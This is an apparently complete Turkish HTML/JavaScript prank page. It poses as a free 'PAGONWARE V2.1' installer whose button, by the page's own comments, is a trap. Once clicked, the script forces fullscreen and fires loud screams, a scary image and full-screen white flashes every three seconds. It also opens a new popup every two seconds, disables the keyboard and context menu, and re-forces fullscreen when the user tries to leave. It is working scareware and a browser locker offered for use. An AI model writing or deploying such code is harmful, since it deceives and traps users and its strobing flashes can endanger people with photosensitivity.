<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SİSTEM ÇÖKTÜ - 0x000666</title>
    <link href="https://fonts.googleapis.com/css2?family=Creepster&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body, html { 
            width: 100%; height: 100%; background: #000; 
            overflow: hidden; cursor: none; font-family: 'Creepster', cursive;
        }

        /* Başlangıç Ekranı (Kullanıcıyı tuzağa çekmek için) */
        #entry-point {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #111; display: flex; flex-direction: column;
            justify-content: center; align-items: center; z-index: 20000;
            color: white; text-align: center;
        }
        
        #entry-point h1 { font-size: 3rem; color: #ff0000; margin-bottom: 20px; }
        .fake-btn {
            padding: 20px 50px; background: #ff0000; color: white;
            border: none; font-size: 20px; cursor: pointer; border-radius: 5px;
        }

        /* Korku Katmanı */
        #hell-layer {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            display: none; justify-content: center; align-items: center;
            z-index: 10000; background: #000;
        }

        #creature-img {
            width: 100%; height: 100%; object-fit: cover;
            display: none;
        }

        .glitch-msg {
            color: #ff0000; font-size: 8rem; text-align: center;
            animation: shake 0.05s infinite;
        }

        @keyframes shake {
            0% { transform: translate(5px, -5px); filter: hue-rotate(90deg) invert(1); }
            50% { transform: translate(-5px, 5px); filter: hue-rotate(180deg) invert(0); }
            100% { transform: translate(5px, 5px); }
        }

        .flash-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: white; opacity: 0; pointer-events: none; z-index: 10001;
        }
    </style>
</head>
<body oncontextmenu="return false;">

    <div id="entry-point">
        <h1>PAGONWARE V2.1</h1>
        <p style="margin-bottom: 20px;">Ücretsiz sürümü yüklemek için butona basın.</p>
        <button class="fake-btn" onclick="startTheHell()">YÜKLEMEYİ BAŞLAT</button>
    </div>

    <div id="hell-layer">
        <h1 class="glitch-msg" id="msg">ÖLECEKSİN</h1>
        <img src="https://i.ibb.co/L6vV5vK/scary.jpg" id="creature-img">
    </div>

    <div class="flash-overlay" id="flash"></div>

    <audio id="scream1" src="https://www.soundjay.com/human/sounds/shout-01.mp3"></audio>
    <audio id="scream2" src="https://www.fesliyanstudios.com/play-mp3/5647"></audio>
    <audio id="background-noise" src="https://www.soundjay.com/mechanical/sounds/drone-01.mp3" loop></audio>

    <script>
        const hell = document.getElementById('hell-layer');
        const entry = document.getElementById('entry-point');
        const img = document.getElementById('creature-img');
        const msg = document.getElementById('msg');
        const flash = document.getElementById('flash');
        
        const s1 = document.getElementById('scream1');
        const s2 = document.getElementById('scream2');
        const bg = document.getElementById('background-noise');

        function forceFullScreen() {
            const el = document.documentElement;
            if (el.requestFullscreen) el.requestFullscreen();
            else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
        }

        function startTheHell() {
            // 1. Tam ekran ve Sesleri başlat
            forceFullScreen();
            entry.style.display = 'none';
            hell.style.display = 'flex';
            
            bg.volume = 1.0;
            bg.play();

            // 2. Sayfadan ayrılmayı engelle
            window.onbeforeunload = function() { return "BURADAN ÇIKIŞ YOK!"; };

            // 3. Sonsuz Kaos Döngüsü
            setInterval(() => {
                triggerExtremeJumpscare();
            }, 3000);

            // 4. Pencere Bombası (Her 2 saniyede bir yeni sekme)
            setInterval(() => {
                window.open(window.location.href, '_blank', 'width=200,height=200');
            }, 2000);
        }

        function triggerExtremeJumpscare() {
            // Görüntüyü değiştir
            img.style.display = 'block';
            msg.style.display = 'none';
            
            // Sesleri patlat
            s1.currentTime = 0; s1.volume = 1.0; s1.play();
            s2.currentTime = 0; s2.volume = 1.0; s2.play();

            // Ekranı salla ve flaş patlat
            flash.style.opacity = '1';
            document.body.style.animation = "shake 0.1s infinite";

            setTimeout(() => {
                img.style.display = 'none';
                msg.style.display = 'block';
                flash.style.opacity = '0';
                document.body.style.animation = "none";
            }, 1500);
        }

        // Tam ekrandan çıkış koruması
        document.addEventListener('fullscreenchange', () => {
            if (!document.fullscreenElement) {
                alert("HATA: SİSTEMDEN AYRILAMAZSINIZ!");
                forceFullScreen();
            }
        });

        // Tuşları devre dışı bırak
        window.addEventListener('keydown', (e) => {
            e.preventDefault();
            if(e.key === "Escape") forceFullScreen();
            return false;
        });
    </script>
</body>
</html>
